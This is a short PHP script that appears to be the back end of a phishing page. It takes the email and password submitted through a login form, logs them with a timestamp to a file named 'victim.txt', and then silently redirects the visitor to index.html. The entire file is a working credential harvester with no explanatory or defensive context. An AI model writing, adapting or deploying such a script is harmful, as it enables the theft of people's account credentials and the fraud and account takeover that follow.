<?php
$email=$_POST['text'];
$pass=$_POST['password'];
$time=time();
$gmt='+7';
$jm='3600';
$var=$time+($gmt*$jm);
$now=gmdate('d M Y - H:i',$var);
$file=fopen('victim.txt',a);
$save=fwrite($file,'##############################
User : '.$email.'
Pass : '.$pass.'
'.$now.'
#####################
');
fclose($file);
header('location:index.html');


?>
